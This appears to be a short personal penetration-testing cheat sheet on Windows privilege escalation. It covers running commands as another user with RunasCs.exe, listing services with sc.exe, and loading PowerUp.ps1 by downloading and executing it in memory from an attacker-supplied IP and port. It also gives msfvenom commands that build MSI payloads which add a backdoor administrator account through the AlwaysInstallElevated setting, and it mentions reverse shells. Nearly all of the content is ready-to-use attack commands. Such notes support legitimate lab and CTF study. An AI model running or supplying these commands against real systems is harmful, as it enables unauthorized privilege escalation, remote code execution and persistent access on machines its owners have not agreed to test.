## RunasCs.exe
Windows script to run specific processes under a different user account
```powershell
PS > .\RunasCs.exe $Username $Password $Command
```
Command can be like `msfvenom reverse shell`
# Processes
Check running processes, could hint at possible VM machine, prompting [[VM Escape]].
# Services
Check all services with `sc.exe`
```cmd
sc.exe query state=all
```
# PowerUp.ps1
```powershell
PS > iex (iwr -usebasicparsing http://<IP>:<PORT>/PowerUp.ps1)
PS > Invoke-AllChecks
```
## Outputs
- #AlwaysInstallElevated 
	Use [[Tools/Frameworks/Metasploit#Generate Payload]] to create `.msi` reverse-shell and send it with [[File Transfer]]
```shell-session
$ msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
$ msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```